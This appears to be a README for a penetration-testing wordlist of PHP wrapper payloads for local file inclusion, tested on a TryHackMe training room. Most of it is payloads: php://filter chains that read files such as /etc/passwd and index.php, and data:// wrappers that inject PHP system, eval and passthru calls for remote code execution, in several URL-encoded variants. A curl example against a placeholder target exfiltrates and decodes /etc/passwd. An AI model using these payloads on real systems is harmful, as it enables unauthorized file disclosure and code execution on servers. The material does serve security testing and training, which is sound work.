# LFI PHP wrapper 
## `LFI-PHP-wrapper.txt`
- Tested against the playground in https://tryhackme.com/room/filepathtraversal
- The payload list given in `LFI-PHP-wrapper.txt` should be modified by replacing the placedholder (`*`) with a common filename, such as `index.php` or `/etc/passwd`.

```shell
$ sed 's/*/index.php/g' [lfi-php-wrapper-txt-filename] > lfi-php-wrappers-custom.txt
$ sed 's/*/\/etc\/passwd/g' [lfi-php-wrapper-txt-filename] > lfi-php-wrappers-custom.txt
```

Eg.

1. `php://filter/convert.base64-encode/resource=*` -> `php://filter/convert.base64-encode/resource=index.php`
2. `php://filter/convert.base64-encode/resource=*` -> `php://filter/convert.base64-encode/resource=/etc/passwd`
   
> For more comprehensive testing, the placeholder can be combined with the payload in dedicated LFI/path-traversal payload list (`LF.md`, etc.). This would effectively combine the capabilities of both wordlists.

### Theory behind the payload values
#### `php://filter` wrapper
```php
php://filter/string.rot13/resource=* 
php://filter/string.toupper/resource=* 
php://filter/convert.base64-encode/resource=* 
php://filter/string.rot13|string.rot13/resource=*
php://filter/read=string.rot13|string.rot13/resource=*
php://filter/string.rot13|convert.base64-encode/resource=*
php://filter/convert.base64-encode|string.rot13/resource=*
php://filter/read=string.rot13|convert.base64-encode/resource=*
php://filter/read=convert.base64-encode|string.rot13/resource=*
php://filter/string.toupper|string.rot13|string.rot13/resource=*
php://filter/read=string.toupper|string.rot13|string.rot13/resource=*
php://filter/zlib.deflate/resource=*
php://filter/bzip2.compress/resource=*
php://filter/zlib.deflate|convert.base64-encode/resource=*
php://filter/bzip2.compress|convert.base64-encode/resource=*
```
**variations derived from:**
1. usage of different PHP filters (https://www.php.net/manual/en/filters.php)
2. chaining filters using `|`
3. using `php://filter/read=` instead of `php://filter`


#### `data://filter` wrapper
```php
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data:text/plain,<?php%20system('id');%20?>
data:text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
data%3Atext%2Fplain%2C%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
data://text/plain,<?php%20eval(\"system('id');\");%20?>
```
**variations derived from:**
1. using both base64 (`data://text/plain;base64`) and plain text input (`data://text/plain`, `data:text/plain`)
2. url encoding variations:
- encoding special chars, different parts of the payload, and encoding an already encoded (first layer with non special char) payload
 - `data://text/plain,<?php passthru('id'); ?>` -> `data://text/plain,%3C?php%20passthru('id');%20?%3E`, `data%3A%2F%2Ftext%2Fplain%2C%3C%3Fphp%20passthru%28%27id%27%29%3B%20%3F%3E`  
 - `data://text/plain,<?php%20passthru('id');%20?>` -> `data://text/plain,%3C?php%2520passthru('id');%2520?%3E`, `data%3A%2F%2Ftext%2Fplain%2C%3C%3Fphp%2520passthru%28%27id%27%29%3B%2520%3F%3E`
   
3. utilizing various methods for achieving RCE: `system('id');`, `eval(\"system('id');\");`, `passthru(\"system('id');\");`


### Examples of working payload
1. ***bzip2 + base64 encode***
```php
php://filter/bzip2.compress|convert.base64-encode/resource=*
php://filter/read=bzip2.compress|convert.base64-encode/resource=*
```
- This will output a base64-encoded value that gives a bzip2 compressed data when decoded

Eg.
```shell
$ curl https://[target].com/page?=php://filter/bzip2.compress|convert.base64-encode/resource=/etc/passwd > output.txt

# extract base64 string
$ cat output.txt

$ echo [base64 string] | base64 -d | bzip2 -d
...
```
